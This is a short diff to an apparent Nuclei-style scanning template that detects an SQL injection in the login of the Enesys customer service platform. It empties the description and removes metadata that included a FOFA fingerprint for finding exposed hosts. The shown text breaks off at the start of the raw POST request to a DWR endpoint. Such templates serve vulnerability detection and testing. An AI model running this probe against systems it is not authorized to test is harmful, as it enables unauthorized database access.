@@ -3,12 +3,8 @@ info:
   name: Enesys客户服务管理平台登录处存SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xeokuwan58652nbx'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xeokuwan58652nbx
-    fofa: body="/dwr/interface/WebContextUtil.js"
 http:
 - raw:
   - 'POST /dwr/exec/WebContextUtil.getBm.dwr HTTP/1.1
